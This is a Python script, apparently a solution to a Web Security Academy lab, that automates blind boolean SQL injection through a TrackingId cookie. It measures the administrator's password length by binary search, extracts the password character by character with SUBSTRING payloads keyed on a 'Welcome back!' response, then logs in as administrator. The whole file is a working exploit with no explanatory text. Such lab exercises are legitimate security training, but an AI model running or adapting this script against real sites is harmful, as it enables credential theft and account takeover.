import asyncio
import aiohttp

ORG_URL = "https://0a4a0074032f509282d18daa00690085.web-security-academy.net";
BASE_URL = ORG_URL+"/filter"
SESSION_ID = "JnfMj5A7C174SYjKn65LGUQmjaB0uAPK"
COOKIE_NAME = "TrackingId"
WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz" 


async def is_find_welcome(session: aiohttp.ClientSession, payload: str) -> bool:
    cookies={
        "TrackingId":payload, 
        "session":"JnfMj5A7C174SYjKn65LGUQmjaB0uAPK"
    }
    params = {"category": "Gifts"}

    async with session.get(BASE_URL, cookies=cookies, params=params, timeout=10, allow_redirects=False) as resp:
        text = await resp.text()
        if "Welcome back!" in text:
            return True
        return False



async def find_char(session: aiohttp.ClientSession, pos: int) -> str:
    for word in WORD_LIST:
        payload = f"' OR (SELECT  SUBSTRING(password FROM {pos} FOR 1)  FROM users WHERE username='administrator')='{word}' -- "
        if await is_find_welcome(session, payload):
            print(f"pos:{pos}, word:{word}===")
            return word
    return "?"  # 如果沒找到


async def find_pw(session: aiohttp.ClientSession, pw_len: int) -> str:   
    tasks = [find_char(session, pos) for pos in range(1, pw_len + 1)]
    results = await asyncio.gather(*tasks)
    return "".join(results)

def login(password:str):
    import requests
    session = requests.Session()
    url = ORG_URL+"/login"

    get_response = session.get(url,timeout=10)
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(get_response.text,"html.parser")
    csrf_input = soup.find("input",{"name":"csrf"})
    csrf = csrf_input.get("value")

    body={
        "csrf":csrf,
        "username":"administrator",
        "password":password
    }
    post_response = session.post(url, data=body,timeout=10)
    print(post_response.text)

async def find_pw_len(session: aiohttp.ClientSession, max_len: int = 50) -> int:
    low, high = 1, max_len
    while low <= high:
        mid = (low + high) // 2
        payload = f"' OR (SELECT CASE WHEN LENGTH(password)>{mid} THEN 'a' ELSE '' END FROM users WHERE username='administrator')='a' -- "
        print(f"payload:{payload}")
        if await is_find_welcome(session, payload):
            low = mid + 1
        else:
            high = mid - 1
    print(f"len:{low}")
    return low

async def main():
    async with aiohttp.ClientSession() as session:
        pw_len = await find_pw_len(session)
        print(f"[+] Password length: {pw_len}")

        pw = await find_pw(session, pw_len)
        print(f"[+] Found password: {pw}")

        login(pw)


if __name__ == "__main__":
    asyncio.run(main())
 